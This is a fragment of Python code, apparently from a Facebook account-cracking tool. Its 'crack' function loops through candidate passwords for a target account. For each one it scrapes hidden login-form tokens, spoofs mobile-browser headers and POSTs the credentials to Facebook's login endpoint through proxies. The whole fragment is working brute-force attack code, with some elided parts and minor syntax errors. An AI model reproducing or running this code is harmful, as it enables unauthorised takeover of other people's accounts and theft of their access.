...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'login': 'Login+In', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			dataa = urlencode(date)
			head = {"Host": url, "method": "POST", "path": f"/login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2Fgaming%2Fplay%2F334672157501043%2F%3Fsource%3Dexternal%257Elink%257Eads%26game_or_link%3D334672157501043%26campaign_id%3D15449786611%26partner_id%3Dgooglesem%26placement%3Dmynase.com%26creative%3D566093193010%26extra_1%3Dc%257Cm%257C566093193010%257C%257C%257Cmynase.com%26extra_2%3Dcampaignid%253D15449786611%2526adgroupid%253D133259188289%2526matchtype%253D%2526network%253Dd%2526source%253Dmobile%2526Search_or_content%253Dc%2526device%253Dm%2526devicemodel%253Doppo%252Bcph2185%2526adposition%253D%2526target%253D%2526targetid%253D%2526loc_physical_ms%253D1010297%2526loc_interest_ms%253D%2526feeditemid%253D%2526param1%253D%2526param2%253D%26gclid%3DEAIaIQobChMI6aTB2sGa-wIVK9nnAx1auwvVEAEYASAAEgKzFPD_BwE%26funnel_id%3D1c98f520-76d6-4f62-87d0-364626f8c243&refsrc=deprecated&ht_token=AbvclrJ1jP8EDjuQ_n7SDTrJbROyXVmdiPhZ8SaqsIKlTdWw&h_consent=1&ht_l=login&lwv=100&locale2=en_GB", content-length": f"{len(str(dataa))}", "cache-contro": "no-cache", "pragma": "no-cache", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/device-based/password/?next=https%3A%2F%2Fm.facebook.com%2Fgaming%2Fplay%2F334672157501043%2F%3Fsource%3Dexternal%257Elink%257Eads%26game_or_link%3D334672157501043%26campaign_id%3D15449786611%26partner_id%3Dgooglesem%26placement%3Dmynase.com%26creative%3D566093193010%26extra_1%3Dc%257Cm%257C566093193010%257C%257C%257Cmynase.com%26extra_2%3Dcampaignid%253D15449786611%2526adgroupid%253D133259188289%2526matchtype%253D%2526network%253Dd%2526source%253Dmobile%2526Search_or_content%253Dc%2526device%253Dm%2526devicemodel%253Doppo%252Bcph2185%2526adposition%253D%2526target%253D%2526targetid%253D%2526loc_physical_ms%253D1010297%2526loc_interest_ms%253D%2526feeditemid%253D%2526param1%253D%2526param2%253D%26gclid%3DEAIaIQobChMI6aTB2sGa-wIVK9nnAx1auwvVEAEYASAAEgKzFPD_BwE%26funnel_id%3D1c98f520-76d6-4f62-87d0-364626f8c243&hide_upsell=1&locale=en_GB&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			
			bx = ses.post(f"https://{url}/login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2Fgaming%2Fplay%2F334672157501043%2F%3Fsource%3Dexternal%257Elink%257Eads%26game_or_link%3D334672157501043%26campaign_id%3D15449786611%26partner_id%3Dgooglesem%26placement%3Dmynase.com%26creative%3D566093193010%26extra_1%3Dc%257Cm%257C566093193010%257C%257C%257Cmynase.com%26extra_2%3Dcampaignid%253D15449786611%2526adgroupid%253D133259188289%2526matchtype%253D%2526network%253Dd%2526source%253Dmobile%2526Search_or_content%253Dc%2526device%253Dm%2526devicemodel%253Doppo%252Bcph2185%2526adposition%253D%2526target%253D%2526targetid%253D%2526loc_physical_ms%253D1010297%2526loc_interest_ms%253D%2526feeditemid%253D%2526param1%253D%2526param2%253D%26gclid%3DEAIaIQobChMI6aTB2sGa-wIVK9nnAx1auwvVEAEYASAAEgKzFPD_BwE%26funnel_id%3D1c98f520-76d6-4f62-87d0-364626f8c243&refsrc=deprecated&ht_token=AbvclrJ1jP8EDjuQ_n7SDTrJbROyXVmdiPhZ8SaqsIKlTdWw&h_consent=1&ht_l=login&lwv=100&locale2=en_GB", headers=head, data=dataa, proxies=proxy)
